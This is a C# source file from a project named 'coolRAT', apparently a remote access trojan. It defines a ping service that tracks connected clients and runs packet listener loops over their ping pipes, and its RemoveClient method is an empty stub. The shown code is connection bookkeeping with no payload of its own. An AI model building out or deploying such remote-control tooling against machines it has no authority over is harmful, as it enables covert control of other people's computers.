using coolRAT.Libs.PacketHandlers;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Libs
{
    public struct ClientInfo
    {
        public Guid ClientUniqueId;
        public Client Client;
        public PacketListenerLoop ListenerLoop;

        public ClientInfo(Guid clientUniqueId, Client client, PacketListenerLoop listenerLoop)
        {
            ClientUniqueId = clientUniqueId;
            Client = client;
            ListenerLoop = listenerLoop;
        }
    }

    public class PingService
    {
        public Dictionary<Guid, ClientInfo> ConnectedClients;

        public PingService(Dictionary<Guid, Client> connectedClients)
        {
            ConnectedClients = new Dictionary<Guid, ClientInfo>();
            foreach (KeyValuePair<Guid, Client> kvp in connectedClients)
                ConnectedClients.Add(kvp.Key, new ClientInfo(kvp.Key, kvp.Value, null));
        }

        public void RunActive()
        {
            foreach(KeyValuePair<Guid, ClientInfo> kvp in ConnectedClients)
            {
                ClientInfo inf = ConnectedClients[kvp.Key];
                inf.ListenerLoop = new PacketListenerLoop(kvp.Value.Client.Pipes.PingPipe,
                    new Ping_PacketHandler(kvp.Value.Client.Pipes.PingPipe));
                ConnectedClients[kvp.Key] = inf;
                Task.Run(() => ConnectedClients[kvp.Key].ListenerLoop.Run());
                Task.Run(() =>
                {
                    PingPacket pingPacket = new PingPacket(Guid.NewGuid());
                    kvp.Value.Client.Pipes.PingPipe.SendPacket(pingPacket);
                });
            }
            // Send first packet
        }

        public void RemoveClient()
        {

        }

        public void RunPassive()
        {
            foreach (KeyValuePair<Guid, ClientInfo> kvp in ConnectedClients)
            {
                ClientInfo inf = ConnectedClients[kvp.Key];
                inf.ListenerLoop = new PacketListenerLoop(kvp.Value.Client.Pipes.PingPipe,
                    new Ping_PacketHandler(kvp.Value.Client.Pipes.PingPipe));
                ConnectedClients[kvp.Key] = inf;
                Task.Run(() => ConnectedClients[kvp.Key].ListenerLoop.Run());
            }
        }
    }
}
